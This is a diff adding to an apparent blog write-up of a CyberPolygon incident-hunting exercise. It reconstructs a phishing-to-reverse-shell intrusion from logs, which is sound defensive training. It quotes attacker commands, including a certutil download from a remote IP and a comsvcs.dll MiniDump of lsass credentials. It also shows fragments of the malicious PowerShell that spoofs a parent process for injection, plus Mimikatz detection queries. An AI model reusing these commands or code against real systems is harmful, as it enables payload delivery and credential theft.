@@ -185,9 +185,23 @@
         <li><a href="#3-sha256-hash-of-the-file-extracted">3. SHA256 hash of the file extracted</a></li>
         <li><a href="#4-file-downloaded-hash">4. File downloaded Hash</a></li>
         <li><a href="#5-os-component-hash">5. OS component Hash</a></li>
+        <li><a href="#6-malicious-domain-name">6. Malicious Domain Name</a></li>
+        <li><a href="#7-md5-of-encoded-code">7. MD5 of Encoded code</a></li>
+        <li><a href="#8-wmi-starters-sha256">8. WMI Starter&rsquo;s SHA256</a></li>
+        <li><a href="#9-code-injection">9. Code Injection</a></li>
+        <li><a href="#10-c2c">10. C2C</a></li>
+        <li><a href="#11-path-of-and-hash-of-bloodhound">11. Path of and Hash of Bloodhound</a></li>
+        <li><a href="#12-memory-dump">12. Memory dump</a></li>
+        <li><a href="#13-login-and-password-of-a-privileges-account">13. Login And Password of a privileges account</a></li>
+        <li><a href="#14-group-sid-of-the-compromised-account">14. Group SID of the compromised account</a></li>
+        <li><a href="#ip-address-for-reverse-shell">IP address for Reverse Shell</a></li>
       </ul>
     </li>
-    <li><a href="#strategy">Strategy</a></li>
+    <li><a href="#strategy">Strategy</a>
+      <ul>
+        <li><a href="#timeline">Timeline</a></li>
+      </ul>
+    </li>
     <li><a href="#investigation">Investigation</a></li>
   </ul>
 </nav>
@@ -242,7 +256,7 @@
 </blockquote>
 <p><code>report.zip</code> - 1 hit, File Created. Some zip archive was saved to disk prior to the attack. However, no SHA256 was provided by the log files. Let&rsquo;s see the same folder. May something was created in the same folder&hellip; .</p>
 <p>Somehow <code>NOT file_name:*.dll</code> didn&rsquo;t work. Search for <code>report.zip</code> returns only one result: file created by Outlook. Let&rsquo;s see who opened it and where was it moved or saved later?</p>
-<p><code>event_type:FileOpen</code> and keyword <code>*.zip</code> -&gt; one hit again. Some <code>Temp_report.zip</code> file was decompressed to <code>market forecast Emma.docx</code>, but no signs of the <code>report.zip</code> saved to the initial directory. However, in the process description there was <code>OPEC  crude oil production.docx</code> mentioned again. Was the zip file renamed and moved and then the file decompressed also renamed? That was the correct answer. Althout, I don&rsquo;t quite get the exact chain of events.</p>
+<p><code>event_type:FileOpen</code> and keyword <code>*.zip</code> -&gt; one hit again. Some <code>Temp_report.zip</code> file was decompressed to <code>market forecast emea.docx</code>, but no signs of the <code>report.zip</code> saved to the initial directory. However, in the process description there was <code>OPEC  crude oil production.docx</code> mentioned again. Was the zip file renamed and moved and then the file decompressed also renamed? That was the correct answer. Althout, I don&rsquo;t quite get the exact chain of events.</p>
 <p>🚰 <strong>Filter</strong>: <code>file_name: *.zip</code>, time span: 📆 <code>June 21, 2021</code> ⏰ from <code>22:30</code> till <code>23:30</code>.</p>
 <p>🚰 <strong>Filter</strong>:</p>
 <ol>
@@ -257,9 +271,180 @@
 </ol>
 <h3 id="4-file-downloaded-hash">4. File downloaded Hash</h3>
 <p><em>The file mentioned in question 3, is not malicious in and of itself, but when it is opened, another file is downloaded from the Internet that already contains the malicious code. Answer the question by specifying the address, from which this file was downloaded, and the SHA256 hash of the downloaded file, separated by commas without spaces.</em></p>
+<p>🚰 <strong>Filter</strong>: <code>keyword: winword.exe AND Category: Network connection detected</code>.</p>
+<p>Result in the <code>enrich.chain</code> field: <code>C:\Windows\explorer.exe -&gt; C:\Program Files (x86)\Microsoft Office\Office16\winword.exe -&gt; 188.135.15.49</code>. But this connection was initiated by the compromised PC at ⏰ 23:25:32. Seconds after report.zip was saved on the system.</p>
+<p>🚰 <strong>Filter</strong>: 188.135.15.49</p>
+<p>At  ⏰ 23:46:10 there were several download requests made via <code>cmd.exe</code> -&gt; <code>certutil.exe</code>.</p>
+<p>Right after this 188.135.15.49.url is saved, another  request comind from cmd.exe is made (already suspicious). <code>certutil -urlcache -f http://188.135.15.49/chrome_installer.log2 C:\Windows\TEMP\chrome_installer.log2:data</code> (ADS?). <code>certutil</code> created a file (FileCreate). <strong>Path</strong> 🛣: <code>C:\Windows\System32\config\SystemProfile\AppData\LocalLow\Microsoft\cryptneturlcache\content\3255d8f28805ee17628e0d2c792ca827</code> and <code>C:\Windows\System32\config\SystemProfile\AppData\LocalLow\Microsoft\cryptneturlcache\metadata\3255d8f28805ee17628e0d2c792ca827</code>. Also, another file was saved by certutil: <code>C:\Windows\System32\config\SystemProfile\AppData\Local\Microsoft\Windows\Inetcache\IE\chrome_installer[1].log2</code>.</p>
+<p>🚰 <strong>Filter</strong>: keyword: chrome_intaller.log2, Timespan expanded (21/06/2021 23:00 - 22/06/2021 01:30).</p>
+<p>Then at ⏰ 23:46:16 certutil was used to decode the file downloaded and saved as at <code>C:\Windows\TEMP\svchost.exe</code>.</p>
+<p>At  ⏰ 23:46:17 svchost was started (PID 3280) and SHA256 is 88EAE7C94142232FBB961DD8381FAEF23129B9F958BE283AE8393D28FED2092B. However, somehow the answer <em>188.135.15.49,88EAE7C94142232FBB961DD8381FAEF23129B9F958BE283AE8393D28FED2092B</em> was not correct. Hm, may be they require the hash of chrome_installer.log2? But there is nothing in file_sha256. Where am I supposed to get that one?</p>
+<p>🚰 <strong>Filter</strong>: keyword: chrome_intaller, the timespan the same as previous.</p>
+<p>Just one result: chrome_installer[1].log2 was found. What I find curious, is that chrome_installer.log2 wasn&rsquo;t.</p>
+<p>🚰 <strong>Filter</strong>: event_type: FileCreate, the timespan is within 21/06/2021, from 23:46:00 to 23:50:00.</p>
+<p>Lots of json files, going by the name, Bloodhound was in place, leaking users and domains.</p>
+<p>🚰 <strong>Filter</strong>: event_type:NetworkConnection AND (net_src_ipv4:188.135.15.49 OR net_dst_ipv4:188.135.15.49)</p>
+<p>In total, there were 7 hits. 5 initiated by winword.exe (at around 23:25) and 2 - later by certutil (at around 23:46).</p>
+<p>🚰 <strong>Filter</strong>:  ( (cmdline:(<em>powershell</em> OR <em>SyncAppvPublishingServer</em> OR <em>pwsh</em>) OR proc_file_originalfilename:&ldquo;PowerShell.EXE&rdquo; OR proc_file_productname:&ldquo;PowerShell Core 6&rdquo; OR proc_file_description:&ldquo;Windows PowerShell&rdquo; OR event_log_source:PowerShell AND event_id:400) AND  cmdline:(&ldquo;Invoke-Mimikatz&rdquo; OR &ldquo;Invoke-ReflectivePEInjection&rdquo; OR &ldquo;Invoke-ReflectiveDllInjection&rdquo; OR &ldquo;Write-BytesToMemory&rdquo; OR &ldquo;Enable-SeDebugPrivilege&rdquo; OR &ldquo;Create-RemoteThread&rdquo;) ) OR (( (event_log_source:PowerShell AND event_id:800) OR (event_log_source:&ldquo;Microsoft-Windows-PowerShell&rdquo; AND event_id:4104) ) AND script_text:(&ldquo;Invoke-Mimikatz&rdquo; OR &ldquo;Invoke-ReflectivePEInjection&rdquo; OR &ldquo;Invoke-ReflectiveDllInjection&rdquo; OR &ldquo;Write-BytesToMemory&rdquo; OR &ldquo;Enable-SeDebugPrivilege&rdquo; OR &ldquo;Create-RemoteThread&rdquo;))</p>
+<p>14 hits. 23:33 and 23:41</p>
+<p>🚰 <strong>Filter</strong>: (cmdline:(<em>mimikatz</em> <em>DumpCerts</em> <em>DumpCreds</em> &ldquo;<em>invoke-mimikatz</em>&quot;)) OR (cmdline:(<em>kerberos</em> <em>sekurlsa</em> <em>logonpasswords</em> <em>lsadump</em> <em>privilege</em>) AND cmdline.keyword:<em>::</em>)</p>
+<p>Nothing</p>
+<p>🚰 <strong>Filter</strong>: event_type:NetworkConnection AND proc_file_path:(&quot;\excel.exe&rdquo; OR &ldquo;\winword.exe&rdquo; OR &ldquo;\powerpnt.exe&rdquo;) AND (enrich.ti.net_dst_ipv4.categories:Malware OR enrich.ti.net_src_ipv4.categories:Malware)</p>
+<p>5 hits, the same as above, when I filtered by a specific IP.</p>
+<p>🚰 <strong>Filter</strong>: event_type:FileCreate AND proc_file_path:(&quot;\excel.exe&quot; OR &ldquo;\winword.exe&rdquo; OR &ldquo;\powerpnt.exe&rdquo;) AND file_path.keyword:(*.exe OR *.dll OR *.cpl OR *.msi OR *.sys)</p>
+<p>No need it excel or powerpoint, but I&rsquo;ve left them just in case. No results, anyway. Got 1 hit when added <code>OR *.ps1</code>.</p>
+<p>🚰 <strong>Filter</strong>: event_type:ProcessCreate AND proc_p_file_path:(&quot;\excel.exe&quot; OR &ldquo;\winword.exe&rdquo; OR &ldquo;\powerpnt.exe&rdquo;)  AND (proc_file_path:&quot;\cmd.exe&quot; OR cmdline:(cmd.exe &ldquo;*cmd *&quot;))</p>
+<p>This filter shows when some office application launches a command line (that&rsquo;s not okay)! Nothing.</p>
+<p>🚰 <strong>Filter</strong>: proc_file_path:&quot;\rundll32.exe&rdquo; AND cmdline.keyword:/.*#[0-9]+/</p>
+<p>No dll function was executed via ordinal number through rundll32.exe. If I remove ordinal number requirement, I get 68 hits. At 23:50:14 this exe was used to create a memory dump at C:\Windows\Temp folder. Marked as credential dumping. The command was rundll32.exe C:\Windows\System32\comsvcs.dll,MiniDump 748 C:\Windows\TEMP\dump.bin full. Looks like memdump with a built-in tool. 748 is the PID of the target process. What process is that? Presumably, lsass, but let&rsquo;s check with a filter.</p>
+<p>The file that&rsquo;s mentioned in the question is obviously the Market Forecast Emea.docx that was opened at 23:27:15. The downloading should have occured right after that, so I need to narrow down the time frame.</p>
 <h3 id="5-os-component-hash">5. OS component Hash</h3>
 <p><em>The malicious code from the file, mentioned in question 4, directly installed a WMI subscription, which we started our hunting with, and also downloaded several files from the Internet to the compromised host. For file downloading, the attacker used a tricky technique that gave him the opportunity to hide the real process, which initiated the corresponding network activity. Specify the SHA256 hash of the operating system component whose functionality was used by the attacker to download files from the Internet.</em></p>
+<p>Probably, they are asking about certutil&rsquo;s SHA. Hm, no. Seems to be some other technique. I&rsquo;ve got a hint from other resources that enrich.ioa.max_confidence:exists might be helpful. Besides, <a href="https://cyberpolygon.com/materials/hunting-for-advanced-tactics-techniques-and-procedures-ttps/">https://cyberpolygon.com/materials/hunting-for-advanced-tactics-techniques-and-procedures-ttps/</a> gives a hint about a possible technique: ieproxy.dll COM object. The filter would be either of the two:</p>
+<ol>
+<li>enrich.ioa.max_confidence:exists,  time frame between 23:24 and 23:30. Look for something right after WMI execution.</li>
+<li>event_type:ImageLoad AND file_path:&quot;*\ieproxy.dll&quot; AND proc_file_path:(&quot;\cscript.exe&quot; OR &ldquo;\wscript.exe&rdquo; OR &ldquo;\powershell.exe&rdquo; OR &ldquo;\winword.exe&rdquo; OR &ldquo;\excel.exe&rdquo; &ldquo;\powerpnt.exe&rdquo; OR &ldquo;\mspub.exe&rdquo; OR &ldquo;\visio.exe&rdquo; OR &ldquo;\msaccess.exe&rdquo; OR &ldquo;\regsvr32.exe&rdquo;)</li>
+</ol>
+<p>5516176cd0f4204ef8cf563c1dd6b3991b134d17eef2cc5e62e7f6c7aadfbb37 - ieproxy.dll hash.</p>
+<h3 id="6-malicious-domain-name">6. Malicious Domain Name</h3>
+<p><em>Specify the domain name of the resource from which the files mentioned in question 5 were supposedly downloaded as a result of malicious code execution.</em></p>
+<p>Right after the image load of the library above, there is a DNS request to <code>raw.githubusercontent.com</code>.</p>
+<h3 id="7-md5-of-encoded-code">7. MD5 of Encoded code</h3>
+<p><em>The first file downloaded (as a result of executing the code in question 5) contained encoded executable code (PE), which after downloading was recorded in the registry. Specify an MD5 hash of the original representation of that code (PE).</em></p>
+<p>⏰ <code>23:26:03.000</code></p>
+<p>The code was saved to registry, the same technique that was used in the previous challenge (CyberCorp). This event happened right after the ieproxy.dll load. The registry key is 🔑 : <code>hkey_current_user\software\registeredapplications\appxs42fd12c3po92dynnq2r142fs12qhvsmvv</code>.</p>
+<p>When looking for an answer to the 8th question, I could see the code for the script. At the very beginning there was a decoding block. It&rsquo;s not hard to copy this data into PowerShell script to see the final result. I am going to add <code>event_log_source</code> column to look for Windows PowerShell logs, that usually log the script body as well. In the enrich.description I will be looking for [1 of 7], meaning the first part out of 7 of the script:</p>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">Process with PID <span class="s1">&#39;5952&#39;</span> execute a script <span class="o">(</span>powershell<span class="o">)</span> 📜️<span class="s1">&#39;c:\users\john.goldberg\appdata\roaming\microsoft\office\mso1033.ps1&#39;</span> <span class="o">[</span><span class="m">1</span> of 7<span class="o">]</span>
+</code></pre></div><p>And here is the code:</p>
+<div class="highlight"><pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="nb">New-PSDrive</span> <span class="n">HKU</span> <span class="n">Registry</span> <span class="n">HKEY_USERS</span>
+<span class="nv">$rk</span> <span class="p">=</span> <span class="s2">&#34;HKU:\S-1-5-21-3899523589-2416674273-2941457644-1104\Software\RegisteredApplications&#34;</span>
+<span class="nv">$rv</span> <span class="p">=</span> <span class="s2">&#34;AppXs42fd12c3po92dynnq2r142fs12qhvsmvv&#34;</span>
+<span class="nv">$p</span> <span class="p">=</span> <span class="p">(</span><span class="nb">gp </span><span class="n">-Path</span> <span class="nv">$rk</span> <span class="n">-Name</span> <span class="nv">$rv</span><span class="p">).</span><span class="nv">$rv</span>
+<span class="nv">$CompBytes</span> <span class="p">=</span> <span class="no">[System.Convert]</span><span class="p">::</span><span class="n">FromBase64String</span><span class="p">(</span><span class="nv">$p</span><span class="p">)</span>
+<span class="nv">$input</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="n">IO</span><span class="p">.</span><span class="n">MemoryStream</span><span class="p">(,</span><span class="nv">$CompBytes</span><span class="p">)</span>
+<span class="nv">$output</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="n">IO</span><span class="p">.</span><span class="n">MemoryStream</span>
+<span class="nv">$gzipStream</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="n">IO</span><span class="p">.</span><span class="n">Compression</span><span class="p">.</span><span class="n">GzipStream</span> <span class="nv">$input</span><span class="p">,(</span><span class="no">[IO.Compression.CompressionMode]</span><span class="p">::</span><span class="n">Decompress</span><span class="p">)</span>
+<span class="nv">$gzipStream</span><span class="p">.</span><span class="n">CopyTo</span><span class="p">(</span><span class="nv">$output</span><span class="p">)</span>
+<span class="nv">$gzipStream</span><span class="p">.</span><span class="n">Close</span><span class="p">()</span>
+<span class="nv">$input</span><span class="p">.</span><span class="n">Close</span><span class="p">()</span>
+<span class="no">[byte[]]</span> <span class="nv">$PEBytes</span> <span class="p">=</span> <span class="nv">$output</span><span class="p">.</span><span class="n">ToArray</span><span class="p">()</span>
+</code></pre></div><p>I will modify it a little (cropped the base64 strings here). A helpful resource <a href="https://gist.github.com/WalternativE/450b155c45f81b14290f8ded8324a283">here</a>.</p>
+<div class="highlight"><pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="nv">$rk</span> <span class="p">=</span> <span class="s2">&#34;H4sIAAAAAAAEAO1Y[...]QAAA==&#34;</span>
+<span class="nv">$CompBytes</span> <span class="p">=</span> <span class="no">[System.Convert]</span><span class="p">::</span><span class="n">FromBase64String</span><span class="p">(</span><span class="nv">$rk</span><span class="p">)</span>
+<span class="nv">$input</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="n">IO</span><span class="p">.</span><span class="n">MemoryStream</span><span class="p">(,</span><span class="nv">$CompBytes</span><span class="p">)</span>
+<span class="nv">$output</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="n">IO</span><span class="p">.</span><span class="n">MemoryStream</span>
+<span class="nv">$gzipStream</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="n">IO</span><span class="p">.</span><span class="n">Compression</span><span class="p">.</span><span class="n">GzipStream</span> <span class="nv">$input</span><span class="p">,(</span><span class="no">[IO.Compression.CompressionMode]</span><span class="p">::</span><span class="n">Decompress</span><span class="p">)</span>
+<span class="nv">$gzipStream</span><span class="p">.</span><span class="n">CopyTo</span><span class="p">(</span><span class="nv">$output</span><span class="p">)</span>
+<span class="nv">$gzipStream</span><span class="p">.</span><span class="n">Close</span><span class="p">()</span>
+<span class="nv">$input</span><span class="p">.</span><span class="n">Close</span><span class="p">()</span>
+<span class="no">[byte[]]</span> <span class="nv">$PEBytes</span> <span class="p">=</span> <span class="nv">$output</span><span class="p">.</span><span class="n">ToArray</span><span class="p">()</span>
+<span class="nv">$hasher</span> <span class="p">=</span> <span class="no">[System.Security.Cryptography.HashAlgorithm]</span><span class="p">::</span><span class="n">Create</span><span class="p">(</span><span class="s1">&#39;md5&#39;</span><span class="p">)</span>
+<span class="nv">$hash</span> <span class="p">=</span> <span class="nv">$hasher</span><span class="p">.</span><span class="n">ComputeHash</span><span class="p">(</span><span class="nv">$PEBytes</span><span class="p">)</span>
+<span class="nv">$hashString</span> <span class="p">=</span> <span class="no">[System.BitConverter]</span><span class="p">::</span><span class="n">ToString</span><span class="p">(</span><span class="nv">$hash</span><span class="p">)</span>
+<span class="nv">$hashString</span> <span class="p">=</span> <span class="nv">$hashString</span><span class="p">.</span><span class="n">Replace</span><span class="p">(</span><span class="s1">&#39;-&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">)</span>
+<span class="nb">Write-Output</span> <span class="nv">$hashString</span>
+</code></pre></div><p>Yes! 🙌 I&rsquo;ve saved the executable with the following script:</p>
+<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">base64</span>
+<span class="kn">import</span> <span class="nn">zlib</span>
+
+<span class="n">string</span><span class="o">=</span><span class="s2">&#34;H4sIA[...]==&#34;</span>
+
+<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&#34;/Users/veronicazvereva/Documents/dfir/cases/CyberPolygon2/malicious.exe&#34;</span><span class="p">,</span> <span class="s2">&#34;wb&#34;</span><span class="p">)</span> <span class="k">as</span> <span class="n">exe</span><span class="p">:</span>
+    <span class="n">exe</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">zlib</span><span class="o">.</span><span class="n">decompress</span><span class="p">(</span><span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">string</span><span class="p">),</span> <span class="mi">15</span> <span class="o">+</span> <span class="mi">32</span><span class="p">))</span> 
+</code></pre></div><p>Now, I need radare2 or IDA Pro to get some insight into what that code is doing. Luckily, the code is very small and should not be hard to untangle. From the very glance I&rsquo;ve recognized some process injection technique. Which one? I will use my own <a href="/docs/dfir/investigation/processes/injections/">article</a> to determine which one and also this <a href="https://i.blackhat.com/USA-19/Thursday/us-19-Kotler-Process-Injection-Techniques-Gotta-Catch-Them-All.pdf">one</a>.</p>
+<p>Seems to be something in between the Process Hollowing and SIR (<strong>S</strong>uspend, <strong>I</strong>nject, <strong>R</strong>esume). The process is created by the malware, like in Process Hollowing, but instead of the whole executable being substituted, just the the thread of rundll32.exe is overwritten.</p>
+<p><img src="images/ida1.png" alt="ida1"></p>
+<p>This gives me another hint to look for in the future: rundll32.exe might is probably malicious now (if the code above was executed successfully).</p>
+<h3 id="8-wmi-starters-sha256">8. WMI Starter&rsquo;s SHA256</h3>
+<p><em>The second file downloaded (as a result of code execution, which we talked about in question 5) was a script, that was set up to autostart via WMI Subscription. Specify the SHA256 hash of this script.</em></p>
+<p>If I observe the chain of event from the same filters, I see that there were two files were downloaded from raw.githubusercontent.com. The second one is obviously a PowerShell script, called mso1033.ps1. I need its hash though. The actual scrip is logged in Windows PowerShell Event Logs, but it&rsquo;s split into 7 part, recorded in 7 separate events, which will make is quite exhausting to assemble. It would be much better to look for simpler ways.</p>
+<p>This script was started by wmiprvse.exe, so, it&rsquo;s our guy.</p>
+<p>🚰 <strong>Filter</strong>: <code>mso1033.ps1</code> as a keyword, time frame 23:24-23:40 and <code>file_sha256:exists</code>.</p>
+<p>Haha! Yes! 6df4709[&hellip;]49ef5. Great!</p>
+<h3 id="9-code-injection">9. Code Injection</h3>
+<p><em>The script, mentioned in question 8, spawned one of the legitimate system processes and injected into its memory a malicious code that was read and decoded from the registry (this code was mentioned in question 7). This malicious code migrated through a chain of code injections to the address space of another legitimate process, where it continued to run without further migration.</em>
+<em>For this answer, provide the next data, separated by a comma without spaces:</em>
+<em>- PID of the initial legitimate system process, which was spawned by the script and where this script launched in-memory execution of malicious code;</em>
+<em>- PID of the target process, to which malicious code migrated from the initial process and in the context of which attacker performed different post-exploitation activity</em></p>
+<p>The firdt process is most likely rundll32.exe, and the second is svchost.exe. I could not find anything by looking for rundll32. I&rsquo;ve decided to look through the ps1 script:</p>
+<div class="highlight"><pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="no">[int]</span><span class="nv">$ppid</span> <span class="p">=</span> <span class="nb">Get-Process</span> <span class="n">-Name</span> <span class="s2">&#34;winlogon&#34;</span> <span class="p">|</span> <span class="nb">Select </span><span class="n">-expand</span> <span class="n">ID</span>
+<span class="nv">$spawnTo</span> <span class="p">=</span> <span class="s2">&#34;c:\Windows\System32\dwm.exe&#34;</span>
+<span class="nv">$currdir</span> <span class="p">=</span> <span class="s2">&#34;c:\Windows\System32&#34;</span>
+<span class="nv">$cmdline</span> <span class="p">=</span> <span class="s2">&#34;dwm.exe&#34;</span>
+<span class="nv">$sInfo</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">StartupInfo</span>
+<span class="nv">$sInfoEx</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">STARTUPINFOEX</span>
+<span class="nv">$pInfo</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">PROCESS_INFORMATION</span>
+<span class="nv">$SecAttr</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">SECURITY_ATTRIBUTES</span>
+<span class="nv">$SecAttr</span><span class="p">.</span><span class="n">nLength</span> <span class="p">=</span> <span class="no">[System.Runtime.InteropServices.Marshal]</span><span class="p">::</span><span class="n">SizeOf</span><span class="p">(</span><span class="nv">$SecAttr</span><span class="p">)</span>
+<span class="nv">$sInfo</span><span class="p">.</span><span class="n">cb</span> <span class="p">=</span> <span class="no">[System.Runtime.InteropServices.Marshal]</span><span class="p">::</span><span class="n">SizeOf</span><span class="p">(</span><span class="nv">$sInfoEx</span><span class="p">)</span>
+<span class="nv">$lpSize</span> <span class="p">=</span> <span class="no">[IntPtr]</span><span class="p">::</span><span class="n">Zero</span>
+<span class="nv">$sInfoEx</span><span class="p">.</span><span class="n">StartupInfo</span> <span class="p">=</span> <span class="nv">$sInfo</span>
+<span class="nv">$hSpoofParent</span> <span class="p">=</span> <span class="no">[Kernel32]</span><span class="p">::</span><span class="n">OpenProcess</span><span class="p">(</span><span class="n">0x1fffff</span><span class="p">,</span> <span class="n">0</span><span class="p">,</span> <span class="nv">$ppid</span><span class="p">)</span>
+<span class="nv">$lpValue</span> <span class="p">=</span> <span class="no">[IntPtr]</span><span class="p">::</span><span class="n">Zero</span>
+<span class="nv">$lpValue</span> <span class="p">=</span> <span class="no">[System.Runtime.InteropServices.Marshal]</span><span class="p">::</span><span class="n">AllocHGlobal</span><span class="p">(</span><span class="no">[IntPtr]</span><span class="p">::</span><span class="n">Size</span><span class="p">)</span>
+<span class="no">[System.Runtime.InteropServices.Marshal]</span><span class="p">::</span><span class="n">WriteIntPtr</span><span class="p">(</span><span class="nv">$lpValue</span><span class="p">,</span> <span class="nv">$hSpoofParent</span><span class="p">)</span>
+<span class="nv">$result1</span> <span class="p">=</span> <span class="no">[Kernel32]</span><span class="p">::</span><span class="n">InitializeProcThreadAttributeList</span><span class="p">(</span><span class="no">[IntPtr]</span><span class="p">::</span><span class="n">Zero</span><span class="p">,</span> <span class="n">1</span><span class="p">,</span> <span class="n">0</span><span class="p">,</span> <span class="no">[ref]</span><span class="nv">$lpSize</span><span class="p">)</span>
+<span class="nv">$sInfoEx</span><span class="p">.</span><span class="n">lpAttributeList</span> <span class="p">=</span> <span class="no">[System.Runtime.InteropServices.Marshal]</span><span class="p">::</span><span class="n">AllocHGlobal</span><span class="p">(</span><span class="nv">$lpSize</span><span class="p">)</span>
+<span class="nv">$result1</span> <span class="p">=</span> <span class="no">[Kernel32]</span><span class="p">::</span><span class="n">InitializeProcThreadAttributeList</span><span class="p">(</span><span class="nv">$sInfoEx</span><span class="p">.</span><span class="n">lpAttributeList</span><span class="p">,</span> <span class="n">1</span><span class="p">,</span> <span class="n">0</span><span class="p">,</span> <span class="no">[ref]</span><span class="nv">$lpSize</span><span class="p">)</span>
+</code></pre></div><p>The chain of execution is as follows: powershell.exe 7324 -&gt; winlogon 1160 -&gt; dwm.exe 8876 -&gt; rundll.32 8344.</p>
+<p>I could not understand, why my answers are not correct. I&rsquo;ve found the correct chain of events using the following technique:</p>
+<ol>
+<li>By reverse engineering the <code>mso1033.ps1</code> script I know, that it searched for winlogon PID and spawns dwm.exe spoofing the parent process. It seems to be winlogon, when it&rsquo;s obviously powershell.exe. That&rsquo;s why we need to look for all events where <code>proc_p_file_path: *winlogon AND proc_file_path: *dwm.exe</code>. In other words, all events where the parent is winlogon and the child is dwm.exe. There are several instances where winlogon spawns dwm.exe. Why? Because <code>dwm.exe</code> <em>is</em> usually the child of <code>winlogon.exe</code>.</li>
+<li>Also from reverse engineering the script mentioned above, I know that the PE saved in registry is then injected into <code>rundll32.exe</code>, spawned by this <code>dwm.exe</code>.</li>
+<li>So, the actual chain of events observed in logs is: winlogon.exe 1160 (spoofed) -&gt; dwm.exe 8876 -&gt; rundll32.exe 8344. However, in reality it is powershell.exe 7324 -&gt; dwm.exe 8876 -&gt; rundll32.exe 8344.</li>
+</ol>
+<p>So, here are the answers:</p>
+<blockquote>
+<p>PID of the initial legitimate system process, which was spawned by the script and where this script launched in-memory execution of malicious code;</p>
+</blockquote>
+<p>This is dwm.exe, 8876, spawned by powershell.exe.</p>
+<blockquote>
+<p>PID of the target process, to which malicious code migrated from the initial process and in the context of which attacker performed different post-exploitation activity</p>
+</blockquote>
+<p>The script spoofed parent id to <code>winlogon.exe</code>, 1160, making it look like winlogon performed all those crappy 💩 stuff. I don&rsquo;t understand, why they are saying &ldquo;migrated&rdquo;. Yes,  attacker did perform other things in the context of winlogon.exe. The code from the registry was PE reflected into dwm.exe process created, but not into winlogon.exe.</p>
+<h3 id="10-c2c">10. C2C</h3>
+<p><em>The malicious code run by the script is a Reverse Shell. Identify the IP address and port number of its command center.</em></p>
+<p>So, ps1 scripts runs this small piece of code from the registry within the dwm.exe address space. This code performs this combined technique (Process Hollowing + SIP) with rundll32.exe process, writing shellcode into its memory. So, I am going to look through the rundll32.exe&rsquo;s activity (PID 8344): <code>proc_id: 8344</code>.</p>
+<p>94.177.253.126:443</p>
+<h3 id="11-path-of-and-hash-of-bloodhound">11. Path of and Hash of Bloodhound</h3>
+<p><em>As a result of running a malicious code, which we talk about in questions 9 and 10, the attacker got a shell on the compromised host. Using this access, the attacker downloaded the Active Directory collection utility to the host in an encoded form. Specify a comma-separated, non-spaced link where the encoded version of the utility was downloaded and a SHA256 hash of the decoded version that was directly run by the attacker on the compromised host.</em></p>
+<h3 id="12-memory-dump">12. Memory dump</h3>
+<p><em>During the post-exploitation process, the attacker used one of the standard Windows utilities to create a memory dump of a sensitive system process that contains credentials of active users in the system. Specify the name of the executable file of the utility used and the name of the memory dump file created, separated by a comma without spaces.</em></p>
+<h3 id="13-login-and-password-of-a-privileges-account">13. Login And Password of a privileges account</h3>
+<p><em>Presumably, the attacker extracted the password of one of the privileged accounts from the memory dump we discussed in the previous question and used it to run a malicious code on one of the domain controllers. What account are we talking about? Specify its username and password as the answer in login:password format.</em></p>
+<h3 id="14-group-sid-of-the-compromised-account">14. Group SID of the compromised account</h3>
+<p><em>A compromised user account is a member of two Built-in privileged groups on the Domain Controller. The first group is the Administrators. Find the second group. Provide the SID of this group as an answer.</em></p>
+<h3 id="ip-address-for-reverse-shell">IP address for Reverse Shell</h3>
+<p><em>As a result of malicious code execution on the domain controller using a compromised account, the attacker got a reverse shell on that host. This shell used a previously not seen IP address as the command center. Specify its address as the answer.</em></p>
 <h2 id="strategy">Strategy</h2>
+<h3 id="timeline">Timeline</h3>
+<p>📆 <code>21/06/2021</code></p>
+<p>⏰ <code>23:25:08</code></p>
+<p><code>report.zip</code> was created by outlook.exe proccess (FileCreate). <code>report (00000002).zip</code> was also created at the same very path. <strong>Path</strong> 🛣:</p>
+<p>⏰ <code>23:25:32</code></p>
+<p>Looks like beaconing. Sec 32&hellip;sec 35&hellip;sec38. Sec 38 - three requests in a row. Originated from <code>winword.exe</code>.</p>
+<p>⏰ <code>23:25:50</code></p>
+<p>WMI command was executed. Filter created?</p>
+<p>⏰ <code>23:25:57</code></p>
+<p>Ieproxy.dll is loaded by winword. Then a request to some raw.githubusercontent.com is made.</p>
+<p>⏰ <code>23:26:03</code></p>
+<p>Something was downloaded from raw.githubusercontent.com and saved in registry: hkey_current_user\software\registeredapplications\appxs42fd12c3po92dynnq2r142fs12qhvsmvv. This event also had the value dumped, it&rsquo;s a base64 encoded string.</p>
+<p>⏰ <code>23:26:09</code></p>
+<p>Using the same ieproxy.dll COM technique, winword.exe downloaded the second file, this time a PowerShell script: mso1033.ps1.</p>
+<p>PowerControl Consumer was created.</p>
+<p>⏰ <code>23:34:01</code> winlogon spawns dwm.exe, started by the ps1 script.</p>
+<p>⏰ <code>23:46:10</code></p>
+<p>Several download requests made via <code>cmd.exe</code> -&gt; <code>certutil.exe</code>.</p>
+<p>⏰ <code>23:46:16</code></p>
+<p>certutil was used to decode the file downloaded and saved as at <code>C:\Windows\TEMP\svchost.exe</code>.</p>
+<p>⏰ <code>23:46:17</code></p>
+<p>svchost was started (PID 3280) and SHA256 is 88EAE7C94142232FBB961DD8381FAEF23129B9F958BE283AE8393D28FED2092B</p>
+<p>⏰ 23:48:10</p>
+<p>svchost created goups.json</p>
